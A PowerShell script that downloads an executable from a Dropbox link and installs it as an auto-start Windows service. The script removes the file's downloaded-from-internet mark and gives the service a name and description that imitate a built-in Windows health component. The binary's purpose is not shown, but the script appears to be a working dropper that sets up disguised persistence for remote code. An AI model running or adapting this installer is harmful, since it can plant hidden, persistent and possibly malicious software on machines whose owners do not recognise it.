<#
.SYNOPSIS
    Automated Deployment Script for Monitor Client (Service Mode)
    
.DESCRIPTION
    1. Downloads MonitorClient.exe.
    2. Unblocks it.
    3. INSTALLS IT AS A WINDOWS SERVICE ("WindowsHealthMonitor").
    4. Sets it to Auto-Start.
    5. Starts it.
    
.NOTES
    REQUIRES ADMINISTRATOR PRIVILEGES.
#>

# --- CONFIGURATION ---
$ClientUrl = "https://www.dropbox.com/scl/fi/g9n5elasjy54dl2kwfntg/MonitorClient.exe?rlkey=wync0ieqrytdi12bugsw6hzu7&st=ndrp049u&dl=1"

$WorkDir = "$env:TEMP\WinHealthInstall"
$ClientExe = "$WorkDir\MonitorClient.exe"
$ServiceName = "WindowsHealthMonitor"
$ServiceDisplay = "Windows Health Monitor Service"
$InstallDir = "$env:ProgramData\WindowsHealth"
$TargetExe = "$InstallDir\MonitorClient.exe"

# --- LOGIC ---

Write-Host "[*] Starting Service Deployment..." -ForegroundColor Cyan

# Check for Admin
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Warning "[-] Script is not running as Administrator. Service installation will fail."
    Write-Host "    Please run PowerShell as Administrator." -ForegroundColor Red
    exit
}

# 1. Create Temp Directory
if (-not (Test-Path $WorkDir)) {
    New-Item -Path $WorkDir -ItemType Directory | Out-Null
}

# 2. Download File
try {
    Write-Host "    [*] Downloading MonitorClient..."
    Invoke-WebRequest -Uri $ClientUrl -OutFile $ClientExe -UseBasicParsing
    if (-not (Test-Path $ClientExe)) { throw "Download failed." }
}
catch {
    Write-Error "[-] Error Downloading File: $_"
    exit
}

# 3. Unblock
Unblock-File -Path $ClientExe

# 4. Move to Permanent Location (ProgramData is good for Services)
if (-not (Test-Path $InstallDir)) {
    New-Item -Path $InstallDir -ItemType Directory | Out-Null
}

# Stop service if running to allow overwrite
$service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
if ($service) {
    Write-Host "    [*] Stopping existing service..."
    Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
}

Write-Host "    [*] Moving binary to: $InstallDir"
Copy-Item -Path $ClientExe -Destination $TargetExe -Force

# 5. Create Service
Write-Host "    [*] Creating Windows Service..."
# Use sc.exe for reliability or New-Service
# sc create "Name" binPath= "Path" start= auto
$binPath = "`"$TargetExe`""
sc.exe create $ServiceName binPath= $binPath start= auto DisplayName= $ServiceDisplay

# 6. Set Description (Optional)
sc.exe description $ServiceName "Monitors system health and telemetry."

# 7. Start Service
Write-Host "    [*] Starting Service..."
Start-Service -Name $ServiceName

# 8. Cleanup
Write-Host "    [*] Cleaning up Temp..."
Remove-Item -Path $WorkDir -Recurse -Force

Write-Host "[+] Service Installation Complete!" -ForegroundColor Green
Write-Host "    Service: $ServiceName"
Write-Host "    Status:  Running (Auto-Start)"
